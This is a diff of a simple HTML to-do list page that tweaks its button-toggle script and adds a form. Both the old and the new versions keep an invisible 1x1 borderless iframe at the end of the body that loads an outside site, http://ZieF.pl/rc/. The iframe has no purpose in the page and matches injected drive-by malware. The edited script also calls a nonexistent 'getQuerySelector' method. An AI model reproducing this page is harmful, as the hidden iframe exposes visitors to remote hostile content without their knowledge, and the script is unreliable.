@@ -4,21 +4,27 @@
         <title>PreIntern Group</title>
         <script>
             function disbtn() {
-                var c=document.getElementById('submit');
+                var s=document.getQuerySelector('#submit');
                 if(txt.value != ''){
-                    cc.disabled = false;
+                    s.disabled = false;
 
                 }
                 else{
-                    c.disabled = true;
+                   s.disabled = true;
                 }
                 
             }
         </script>
     </head>
     <body>
+<h1>To Do List</h1>
+<ul>
+</ul>
+<form>
+
         <input id="txt" placeholder="Add todo task" type="text" onkeyup="disbtn()">
         <input type="submit" id="submit" disabled>
-    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+    </form>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
 </body>
 </html>
